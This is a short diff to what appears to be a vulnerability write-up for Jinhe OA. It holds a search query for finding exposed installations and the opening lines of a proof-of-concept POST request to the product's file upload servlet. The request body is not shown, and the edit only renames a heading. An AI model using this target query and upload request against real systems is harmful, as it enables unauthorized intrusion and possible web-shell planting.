@@ -7,7 +7,7 @@
 app="金和网络-金和OA"||body="/jc6/platform/sys/login"
 ```
 
-## poc
+## POC
 ```
 POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
 Host: 127.0.0.1
